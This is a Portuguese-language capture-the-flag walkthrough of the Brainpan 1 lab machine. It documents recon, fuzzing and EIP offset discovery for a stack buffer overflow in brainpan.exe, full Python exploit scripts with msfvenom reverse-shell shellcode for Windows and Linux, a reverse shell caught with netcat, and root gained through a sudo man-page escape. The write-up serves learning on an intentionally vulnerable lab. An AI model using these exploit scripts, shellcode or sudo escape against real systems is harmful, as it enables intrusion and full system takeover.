# BRAINPAIN 1


### Nmap

```
nmap -vvv -sV -sC -oN nmap.txt -Pn 10.10.170.210 

PORT      STATE SERVICE REASON         VERSION
9999/tcp  open  abyss?  syn-ack ttl 63
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    syn-ack ttl 63 SimpleHTTPServer 0.6 (Python 2.7.3)
| http-methods: 
|_  Supported Methods: GET
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
|_http-title: Site doesn't have a title (text/html).
```

### Gobuster

- Não roda na porta 9999, somente na porta 10000.

```
gobuster dir -e -u http://10.10.170.210:10000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

http://10.10.170.210:10000/bin                  (Status: 301) [Size: 0] [--> /bin/]
```

### Arquivo executável de Windows.

- http://10.10.170.210:10000/bin/
	- brainpan.exe

### Identificação da arquitetura do aplicativo

- Identificado que é um aplicativo do tipo 32-bits/X86
```
file brainpan.exe   
brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
```

### Porta 9999

- Não é possível com a senha via HTTP, mas via NC é possível.

```
nc 10.10.231.132 9999                                                                                                                                         130 ⨯
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >>
```

### Execução do binário brainpain.exe.

- No Windows o arquivo executa e fica com a porta 9999 em modo de escuta.
    - Windows 10 Enterprise x64
- No Kali Linux, efetuado a conexão com o binário na máquina Windows, através do netcat.
    - nc 192.168.0.116 9999

### Fuzzing

- Criado um fuzzing, simples em python para envio de bytes para a aplicação.
- o intuito é causar uma quebra na aplĩcação, devido a um uso excessivo de bytes.

```
#!/usr/bin/python3

import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("192.168.0.116",9999))
        s.recv(1024)
        s.send(buffer + "\r\n")
        s.close()
        sleep(1)
        buffer = buffer + "A" * 100

    except:
       print("Fuzzing crashed at %s bytes" % str(len(buffer)))
       sys.exit()
```
- A aplicação quebrou em 700 bytes.
```
python fuzzing.py
^CFuzzing crashed at 700 bytes
```

### Procurar pelo offset

- Criado um padrão de 700 bytes, que usaremos determinar o deslocamento da falha.
- Assim é controlado com precisão o valor inserido no EIP.
- EIP é o registrador que precisamos controlar, para inserir um shell reverso na aplicação.

```
msf-pattern_create -l 700
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A
```
- Criado um novo script para envio desse padrão, mas agora removido o laço while, pois não é mais intuito descobrir em quantos bytes trava a aplicação, pois já sabemos.
```
#!/usr/bin/python3

import sys, socket
from time import sleep

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A"


try:
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   s.connect(("192.168.0.116",9999))
   s.recv(1024)
   s.send(buffer + "\r\n")
   s.close()
   

except:
   print("Application crashed")
   sys.exit()
```
- Ao executar o novo fuzzing_2.py, identificamos que a aplicação travou e o EIP está com o valor 35724134.
- Agora é necessaŕio identificar o deslocamento do EIP para que possamos manipular esse registrador.
- Criado uma novo padrão para isso e um script python fuzzing_3.py, para manipulação desse novo padrão.
```
msf-pattern_offset -l 700 -q 35724134                                                                                                                          1 ⚙
[*] Exact match at offset 524
```
```
#!/usr/bin/python3

import sys, socket
from time import sleep

filler = "A" * 524
EIP = "B" * 4
offset = "C" * 4
junk = "D" * (700-len(filler)-len(EIP))
buffer = filler + EIP + offset + junk

try:
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   s.connect(("192.168.0.116",9999))
   s.recv(1024)
   s.send(buffer + "\r\n")
   s.close()

except:
   print("Application crashed")
   sys.exit()
```
- Ao executar o script python, identificamos que agora temos total controle sobre o EIP que recebeu o valor 42424242(BBBB), no top da Stack temos o valor 43434343(CCCC) e no resto da stack, podemos ver todos os 444444444444(DDDDDDDDDD).
- Deu sucesso!

### Bad Chars

- Necessário remover os bad chars, que possam quebrar o nosso exploit
- Abaixo os badchars.
```
\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f
\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40
\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f
\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f
\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f
\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf
\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf
\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```
- criado um novo script python, adicionados os badchars.
```
#!/usr/bin/python3

import sys, socket
from time import sleep

badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

filler = "A" * 524
EIP = "B" * 4
offset = "C" * 4
junk = "D" * (700 -len(filler)-len(EIP))
buffer = filler + EIP + offset + badchars

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.0.116",9999))
    s.recv(1024)
    s.send(buffer + "\r\n")
    s.close()

except:
   print("Application crashed")
   sys.exit()
```
- Para verificar se há algum problema, cliquei com o botão direito do mouse no ESP e selecione "follow in Dump".
- Podemos ver no "Follow in Dump", que os 4 primeiros bytes são 43434343 (CCCC), seguidos null byte (00), que é também seguido de FB.
- No lugar de 00 FB, deveria ter um 01.
- Removido o "\x00" do script e executado novamente.
- Agora em "Follow in Dump", podemos ver não há mais nenhum caractere acompanhado de FB, ou seja, não há mais "Bad Chars".


### Encontrar um endereço de retorno.

- Dentro do immunity debugger, usamos o plugin "mona.py", executando o comando "!mona modules" na barra inferior, podemos ver todos os módulos usados.
- Procuramos por módulos que tenham "false" nas colunas.
```
Log data, item 10
 Address=0BADF00D
 Message= 0x31170000 | 0x31176000 | 0x00006000 | False  | False   | False |  False   | False  | -1.0- [brainpan.exe] (C:\Users\Desec\Desktop\brainpan.exe)
```
- Identificamos que o único módulo disponível com "false" é o próprio brainpan.exe.

- Agora é necessário verificar se há ponteiros JMP ESP.
```
!mona find -s "\xff\xe4" -m brainpan.exe

Log data, item 3
 Address=311712F3
 Message=  0x311712f3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\Desec\Desktop\brainpan.exe)
```
- Identificado o endereço de memória 0x311712f3 do ponteiro JMP ESP.
- As arquiteturas x86, usam valores na memória em little endian, que são aos contrário, precisam inverter a ordem dos bytes ao adicionar no novo script.

- Atualizado o script python, para fuzzing_5.py.
- EIP = "\xf3\x12\x17\x31" #JMP ESP - 311712f3
```
#!/usr/bin/python3

import sys, socket
from time import sleep

#badchars = /x00

filler = "A" * 524
EIP = "\xf3\x12\x17\x31" #JMP ESP - 311712f3
offset = "C" * 4
junk = "D" * (700 -len(filler)-len(EIP))
buffer = filler + EIP + offset + junk

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("192.168.0.116",9999))
    s.recv(1024)
    s.send(buffer + "\r\n")
    s.close()

except:
   print("Application crashed")
   sys.exit()
```

### Criando um shellcode

- Criação do reverse shell com o msfvenom, com o endereço IP da VPN, pois agora o próximo script a ser contruido será usado já no alvo da VPN.
- O shellcode foi criado no modelo windows, pois se acredita que esse é o SO, já que o brainpan.exe é um aplicativo windows.
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.185.104 LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b "\x00"                                 2 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xd9\xc3\xd9\x74\x24\xf4\xba\xb6\xdb\x55\x9a\x5d\x31\xc9\xb1"
"\x52\x83\xed\xfc\x31\x55\x13\x03\xe3\xc8\xb7\x6f\xf7\x07\xb5"
"\x90\x07\xd8\xda\x19\xe2\xe9\xda\x7e\x67\x59\xeb\xf5\x25\x56"
"\x80\x58\xdd\xed\xe4\x74\xd2\x46\x42\xa3\xdd\x57\xff\x97\x7c"
"\xd4\x02\xc4\x5e\xe5\xcc\x19\x9f\x22\x30\xd3\xcd\xfb\x3e\x46"
"\xe1\x88\x0b\x5b\x8a\xc3\x9a\xdb\x6f\x93\x9d\xca\x3e\xaf\xc7"
"\xcc\xc1\x7c\x7c\x45\xd9\x61\xb9\x1f\x52\x51\x35\x9e\xb2\xab"
"\xb6\x0d\xfb\x03\x45\x4f\x3c\xa3\xb6\x3a\x34\xd7\x4b\x3d\x83"
"\xa5\x97\xc8\x17\x0d\x53\x6a\xf3\xaf\xb0\xed\x70\xa3\x7d\x79"
"\xde\xa0\x80\xae\x55\xdc\x09\x51\xb9\x54\x49\x76\x1d\x3c\x09"
"\x17\x04\x98\xfc\x28\x56\x43\xa0\x8c\x1d\x6e\xb5\xbc\x7c\xe7"
"\x7a\x8d\x7e\xf7\x14\x86\x0d\xc5\xbb\x3c\x99\x65\x33\x9b\x5e"
"\x89\x6e\x5b\xf0\x74\x91\x9c\xd9\xb2\xc5\xcc\x71\x12\x66\x87"
"\x81\x9b\xb3\x08\xd1\x33\x6c\xe9\x81\xf3\xdc\x81\xcb\xfb\x03"
"\xb1\xf4\xd1\x2b\x58\x0f\xb2\x59\x94\xb6\x2a\x36\xa4\xc8\xbb"
"\x9a\x21\x2e\xd1\x32\x64\xf9\x4e\xaa\x2d\x71\xee\x33\xf8\xfc"
"\x30\xbf\x0f\x01\xfe\x48\x65\x11\x97\xb8\x30\x4b\x3e\xc6\xee"
"\xe3\xdc\x55\x75\xf3\xab\x45\x22\xa4\xfc\xb8\x3b\x20\x11\xe2"
"\x95\x56\xe8\x72\xdd\xd2\x37\x47\xe0\xdb\xba\xf3\xc6\xcb\x02"
"\xfb\x42\xbf\xda\xaa\x1c\x69\x9d\x04\xef\xc3\x77\xfa\xb9\x83"
"\x0e\x30\x7a\xd5\x0e\x1d\x0c\x39\xbe\xc8\x49\x46\x0f\x9d\x5d"
"\x3f\x6d\x3d\xa1\xea\x35\x5d\x40\x3e\x40\xf6\xdd\xab\xe9\x9b"
"\xdd\x06\x2d\xa2\x5d\xa2\xce\x51\x7d\xc7\xcb\x1e\x39\x34\xa6"
"\x0f\xac\x3a\x15\x2f\xe5";
```
- Criamos o script necessário para o ataque, em python.
```
#!/usr/bin/python3                                                                                                        
                                                                                                                          
import sys, socket                                                                                                        
from time import sleep                                                                                                    
                                                                                                                          
#badchars = /x00                                                                                                          
                                                                                                                          
#msfvenom -p windows/shell_reverse_tcp LHOST=VPN IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b "\x00"
                                                                                                                          
payload = ("\xd9\xc3\xd9\x74\x24\xf4\xba\xb6\xdb\x55\x9a\x5d\x31\xc9\xb1"
"\x52\x83\xed\xfc\x31\x55\x13\x03\xe3\xc8\xb7\x6f\xf7\x07\xb5"
"\x90\x07\xd8\xda\x19\xe2\xe9\xda\x7e\x67\x59\xeb\xf5\x25\x56"
"\x80\x58\xdd\xed\xe4\x74\xd2\x46\x42\xa3\xdd\x57\xff\x97\x7c"
"\xd4\x02\xc4\x5e\xe5\xcc\x19\x9f\x22\x30\xd3\xcd\xfb\x3e\x46"
"\xe1\x88\x0b\x5b\x8a\xc3\x9a\xdb\x6f\x93\x9d\xca\x3e\xaf\xc7"
"\xcc\xc1\x7c\x7c\x45\xd9\x61\xb9\x1f\x52\x51\x35\x9e\xb2\xab"
"\xb6\x0d\xfb\x03\x45\x4f\x3c\xa3\xb6\x3a\x34\xd7\x4b\x3d\x83"
"\xa5\x97\xc8\x17\x0d\x53\x6a\xf3\xaf\xb0\xed\x70\xa3\x7d\x79"
"\xde\xa0\x80\xae\x55\xdc\x09\x51\xb9\x54\x49\x76\x1d\x3c\x09"
"\x17\x04\x98\xfc\x28\x56\x43\xa0\x8c\x1d\x6e\xb5\xbc\x7c\xe7"
"\x7a\x8d\x7e\xf7\x14\x86\x0d\xc5\xbb\x3c\x99\x65\x33\x9b\x5e"
"\x89\x6e\x5b\xf0\x74\x91\x9c\xd9\xb2\xc5\xcc\x71\x12\x66\x87"
"\x81\x9b\xb3\x08\xd1\x33\x6c\xe9\x81\xf3\xdc\x81\xcb\xfb\x03"
"\xb1\xf4\xd1\x2b\x58\x0f\xb2\x59\x94\xb6\x2a\x36\xa4\xc8\xbb"
"\x9a\x21\x2e\xd1\x32\x64\xf9\x4e\xaa\x2d\x71\xee\x33\xf8\xfc"
"\x30\xbf\x0f\x01\xfe\x48\x65\x11\x97\xb8\x30\x4b\x3e\xc6\xee"
"\xe3\xdc\x55\x75\xf3\xab\x45\x22\xa4\xfc\xb8\x3b\x20\x11\xe2"
"\x95\x56\xe8\x72\xdd\xd2\x37\x47\xe0\xdb\xba\xf3\xc6\xcb\x02"
"\xfb\x42\xbf\xda\xaa\x1c\x69\x9d\x04\xef\xc3\x77\xfa\xb9\x83"
"\x0e\x30\x7a\xd5\x0e\x1d\x0c\x39\xbe\xc8\x49\x46\x0f\x9d\x5d"
"\x3f\x6d\x3d\xa1\xea\x35\x5d\x40\x3e\x40\xf6\xdd\xab\xe9\x9b"
"\xdd\x06\x2d\xa2\x5d\xa2\xce\x51\x7d\xc7\xcb\x1e\x39\x34\xa6"
"\x0f\xac\x3a\x15\x2f\xe5")

filler = "A" * 524
EIP = "\xf3\x12\x17\x31" #JMP ESP - 311712f3
offset = "C" * 4
nops = "\x90" * 32
buffer = filler + EIP + offset + nops + payload

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.215.180",9999))
    s.recv(1024)
    s.send(buffer + "\r\n")
    s.close()

except:
   print("Application crashed")
   sys.exit()
```
- Aberto um netcat, para ficar aguardando conexão na porta 4444.
- Executado o script python e conseguimos pegar um shell reverso no servidor do brainpan.
```
nc -vnlp 4444        
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.215.180.
Ncat: Connection from 10.10.215.180:59943.
CMD Version 1.4.1

Z:\home\puck>
```
- Identificado que é um servidor Linux, que executa a aplicação brainpan.exe, via wine.
- Com isso criamos um novo shellcode, agora para em reverse shell para Linux e adcionamos ao script python.
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.9.185.104 LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xda\xd2\xbf\x59\x63\xc8\x55\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x12\x83\xea\xfc\x31\x7a\x13\x03\x23\x70\x2a\xa0\xe2\xad\x5d"
"\xa8\x57\x11\xf1\x45\x55\x1c\x14\x29\x3f\xd3\x57\xd9\xe6\x5b"
"\x68\x13\x98\xd5\xee\x52\xf0\xef\x19\x1c\x68\x98\x1b\x5e\x79"
"\x04\x95\xbf\xc9\xd2\xf5\x6e\x7a\xa8\xf5\x19\x9d\x03\x79\x4b"
"\x35\xf2\x55\x1f\xad\x62\x85\xf0\x4f\x1a\x50\xed\xdd\x8f\xeb"
"\x13\x51\x24\x21\x53";
```
- Script python com a versão do shellcode atualizado para Linux.
```
#!/usr/bin/python3

import sys, socket
from time import sleep

#badchars = /x00

#msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.9.185.104 LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b "\x00"

payload = ("\xda\xd2\xbf\x59\x63\xc8\x55\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x12\x83\xea\xfc\x31\x7a\x13\x03\x23\x70\x2a\xa0\xe2\xad\x5d"
"\xa8\x57\x11\xf1\x45\x55\x1c\x14\x29\x3f\xd3\x57\xd9\xe6\x5b"
"\x68\x13\x98\xd5\xee\x52\xf0\xef\x19\x1c\x68\x98\x1b\x5e\x79"
"\x04\x95\xbf\xc9\xd2\xf5\x6e\x7a\xa8\xf5\x19\x9d\x03\x79\x4b"
"\x35\xf2\x55\x1f\xad\x62\x85\xf0\x4f\x1a\x50\xed\xdd\x8f\xeb"
"\x13\x51\x24\x21\x53")

filler = "A" * 524
EIP = "\xf3\x12\x17\x31" #JMP ESP - 311712f3
offset = "C" * 4
nops = "\x90" * 32
buffer = filler + EIP + offset + nops + payload

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.215.180",9999))
    s.recv(1024)
    s.send(buffer + "\r\n")
    s.close()

except:
   print("Application crashed")
   sys.exit()
```
- Agora temos uma shell reversa no servidor alvo.
```
nc -vnlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.215.180.
Ncat: Connection from 10.10.215.180:59944.
id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
python -c 'import pty;pty.spawn("/bin/bash")'
puck@brainpan:/home/puck$ 
```

### Escalação de privilégios

- O buffer overflow está pronto, mas agora que temos ao servidor alvo, temos de ter escalar privilégios de administrador.
- Identificado que é um binário com permissão de execução como root que possa ajudar a escalonar o acesso.
```
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```
- Ao executar o binário, nos dá 3 opções.
```
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```
- Então vamos acessar o manual do "bash"
- Após entrar no manual digitamos "!bash" e com isso ganhamos o acesso de "root" ao servidor.
```
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual bash
sudo /home/anansi/bin/anansi_util manual bash
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)
```
- Pressionado "ENTER".
- Agora pegamos o root no servidor.
```
BASH(1)                                                                BASH(1)

NAME
       bash - GNU Bourne-Again SHell

SYNOPSIS
       bash [options] [file]

COPYRIGHT
       Bash is Copyright (C) 1989-2011 by the Free Software Foundation, Inc.

DESCRIPTION
       Bash  is  an  sh-compatible  command language interpreter that executes
       commands read from the standard input or from a file.  Bash also incor‐
       porates useful features from the Korn and C shells (ksh and csh).

       Bash  is  intended  to  be a conformant implementation of the Shell and
       Utilities portion  of  the  IEEE  POSIX  specification  (IEEE  Standard
       1003.1).  Bash can be configured to be POSIX-conformant by default.

OPTIONS
       All  of  the  single-character shell options documented in the descrip‐
       tion of the set builtin command can be used as options when  the  shell
 Manual page bash(1) line 1 (press h for help or q to quit)!bash
!bash
root@brainpan:/usr/share/man# whoami
whoami
root
```

### Flag de root

- Captura do flag de root.
```
root@brainpan:/usr/share/man# cd /root
cd /root
root@brainpan:~# ls
ls
b.txt
root@brainpan:~# cat b.txt
cat b.txt
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|


                                              http://www.techorganic.com 



root@brainpan:~# 
```


